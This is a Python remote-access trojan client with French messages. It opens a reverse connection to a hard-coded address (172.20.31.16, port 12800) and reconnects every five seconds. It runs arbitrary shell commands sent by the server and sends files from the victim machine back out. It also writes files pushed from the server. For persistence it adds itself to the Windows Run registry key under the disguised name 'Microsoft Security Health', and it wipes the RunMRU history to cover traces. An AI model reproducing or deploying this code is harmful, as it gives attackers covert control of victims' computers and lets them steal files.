import socket, os, subprocess, time, sys

hote = "172.20.31.16"
port = 12800

def connxion(hote,port):
    connect_to_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connect_to_server.connect((hote, port))
    except ConnectionRefusedError:
        return 1
    
    print("Connexion établie avec le serveur sur le port {}".format(port))

    target_job = "void"
    while True:

        try:
            msg_recu = connect_to_server.recv(1024)
        
        
            msg_arg = msg_recu.decode().split(" ")

            if target_job == "void":
                if msg_arg[0] == "tlakoya":
                    connect_to_server.send("jsuislakoya".encode())

                elif msg_arg[0] == "send":
                    print(" ".join(msg_arg))
                    try:
                        connect_to_server.send("receivedthesendperfectly".encode())
                    except:
                        connect_to_server.close()
                        return 1

                elif msg_arg[0] == "remote_terminal":
                    target_job = "remote_terminal"

                elif msg_arg[0] == "close_server_client":
                    connect_to_server.close()
                    break

            elif target_job == "remote_terminal":

                if msg_arg[0] == "close_remote_terminal":
                    target_job = "void"

                elif msg_arg[0] == "download_from_server":

                    print("telechargement de :",msg_arg[2])
                    downloading_file = open(msg_arg[2],"wb")
        
                    downloading_file_bytes = connect_to_server.recv(int(msg_arg[1]))
                    downloading_file.write(downloading_file_bytes)

                    downloading_file.close()
                    connect_to_server.send(b"ok")


                elif msg_arg[0] == "download_from_target":
                    if len(msg_arg) > 1:
                        try:
                            le_fichier = open(msg_arg[1],"rb")
                            le_fichier_size = len(le_fichier.read())
                            connect_to_server.send(msg_arg[0].encode()+b" "+str(le_fichier_size).encode()+b" "+msg_arg[1].encode())

                            le_fichier.seek(0)
                            le_fichier_bytes = le_fichier.read(le_fichier_size)
                            connect_to_server.send(le_fichier_bytes)

                        except FileNotFoundError:
                            connect_to_server.send(b"file not found")


                else:
                    stderr = b''
                    stdout = b''
                    
                    if msg_arg[0] == 'cd':
                        directory = " ".join(msg_arg[1:])
                        try:
                            os.chdir(directory)
                        except FileNotFoundError:
                            stderr = b"Le dossier/fichier n'existe pas"
                    
                    elif "".join(msg_arg) == "":
                        stdout = b" "

                    else:
                        commande = " ".join(msg_arg).encode()
                        spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = spl.communicate()

                    if stdout == b'' and stderr == b'':
                        command = b" " 
                    elif stdout == b'' and stderr != b'':
                        command = stderr
                    elif stderr == b'' and stdout != b'':
                        command = stdout

                    connect_to_server.send(command)
                    
        except ConnectionAbortedError:
            connect_to_server.close()
            return 1
        except ConnectionResetError:
            connect_to_server.close()
            return 1
    

    return 0

def auto_setup_whetever_you_are():
    path_file = os.getcwd()+"\\"+sys.argv[0]
    if "\\" in sys.argv[0]:
        path_file = sys.argv[0]

    commande = []
    commande.append('reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Security Health" /t REG_SZ /d "' + path_file + '"')
    commande.append('reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f')
    while commande:
        subprocess.Popen(commande.pop(0), shell=True)
    

auto_setup_whetever_you_are()

while True:
    connxion(hote,port)
    print("reco dans 5 secondes")
    time.sleep(5)